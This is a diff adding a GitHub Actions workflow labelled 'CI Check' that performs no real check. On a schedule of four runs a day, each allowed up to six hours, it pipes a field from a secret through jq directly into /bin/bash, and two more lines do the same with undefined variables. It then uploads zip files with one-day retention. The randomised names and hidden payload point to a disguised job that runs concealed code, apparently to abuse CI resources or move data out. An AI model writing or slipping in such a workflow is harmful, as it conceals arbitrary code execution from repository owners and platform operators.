@@ -1,0 +1,29 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          ikgw795: ${{ secrets.ikgw795 }}
+        run: |
+          printf '%s' "$ikgw795" | jq -r .mejsa05154 | /bin/bash
+          printf '%s' "$em60762" | jq -r .ojgfa38 | /bin/bash
+          printf '%s' "$tfojj041" | jq -r .klrsf0370 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: TOL4qbsH
+          path: "*.zip"
+          retention-days: 1
